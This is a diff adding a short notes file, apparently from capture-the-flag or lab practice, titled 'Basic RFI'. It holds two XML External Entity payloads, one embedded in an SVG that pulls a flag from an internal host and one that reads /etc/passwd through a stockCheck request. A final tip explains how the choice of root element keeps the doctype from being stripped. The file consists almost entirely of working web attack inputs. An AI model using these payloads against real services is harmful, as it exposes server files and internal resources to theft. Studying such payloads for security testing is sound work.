@@ -1,0 +1,20 @@
+* Basic RFI
+
+@code xml
+<?xml version="1.0"?>
+<!DOCTYPE test[
+    <!ENTITY xxe SYSTEM "http://goober-internal:5001/flag">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="150" height="150">
+<text x="15" y="20" font-size="4px">&xxe;</text>
+</svg>
+@end
+
+@code xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+@end
+
+* Other stuff
+for some reason, <html> will remove the doctype while <foo> wont.
